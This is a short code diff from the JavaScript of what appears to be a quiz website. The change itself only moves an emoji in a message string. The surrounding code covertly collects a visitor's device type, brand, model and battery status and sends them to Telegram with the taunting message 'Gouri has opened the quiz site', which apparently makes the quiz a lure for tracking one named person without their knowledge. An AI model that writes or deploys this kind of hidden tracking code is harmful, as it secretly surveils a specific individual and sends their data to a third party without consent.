@@ -413,7 +413,7 @@
             if (navigator.getBattery) {
                 navigator.getBattery().then(battery => {
                     batteryInfo = `${Math.round(battery.level * 100)}% ${battery.charging ? 'charging' : 'not charging'}`;
-                    const message = `YOO XD!!!\n🫦 Gouri has opened the quiz site🙈\n📲Device: ${deviceInfo}\n🖥️Device Name: ${brand}\n📱Device Model: ${model}\n🔋Battery: ${batteryInfo}\n------------------------------------\n🎮Server Info\n● 📶 Connection Success.\n● 🐞Bugs: No errors Found.`;
+                    const message = `YOO XD!!!🫦\nGouri has opened the quiz site🙈\n📲Device: ${deviceInfo}\n🖥️Device Name: ${brand}\n📱Device Model: ${model}\n🔋Battery: ${batteryInfo}\n------------------------------------\n🎮Server Info\n● 📶 Connection Success.\n● 🐞Bugs: No errors Found.`;
                     sendMessageToTelegram(message);
                 }).catch(err => console.error('Battery API error:', err));
             } else {
